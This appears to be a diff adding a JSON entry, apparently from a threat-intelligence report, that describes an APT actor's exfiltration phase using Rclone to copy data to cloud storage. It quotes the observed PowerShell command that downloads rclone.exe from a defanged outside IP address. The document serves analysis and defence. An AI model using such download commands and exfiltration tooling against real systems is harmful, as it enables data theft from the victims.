@@ -1,0 +1,6 @@
+[
+    {
+        "title": "Exfiltration",
+        "content": "In the previous phase, we observed that the actors use several tools to get the whole picture of the network infrastructure and bypass the firewall. Afterward, we observed a PowerShell command used to download an effective tool, Rclone, which is used for exfiltration. It also provides an easy and effective way of copying data to several cloud storage providers.\nC:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command \"$(new-object System.Net.WebClient).DownloadFile('http://195[.]123[.]221[.]7:8080/rclone.exe', 'r.exe')\"\nBased on previous experience, Rclone has frequently been used in ransomware attacks to exfiltrate stolen data. However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks."
+    }
+]
